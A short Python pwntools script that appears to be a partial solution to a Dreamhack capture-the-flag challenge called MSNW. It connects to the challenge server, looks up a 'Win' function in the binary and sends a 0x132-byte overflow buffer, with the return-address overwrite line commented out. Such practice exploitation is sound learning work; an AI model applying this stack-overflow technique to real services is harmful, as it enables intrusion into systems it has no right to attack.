from pwn import *

port = 21642
rem = remote("host3.dreamhack.games", port)

elf = ELF("./Pwnable/MSNW/problem/deploy/msnw")

win_addr = elf.symbols['Win']

payload = b'A' * 0x132
# payload += p64(win_addr)
rem.sendlineafter(b": ", payload)

# print(rem.recvn(20))

print(b'A' * 0x132)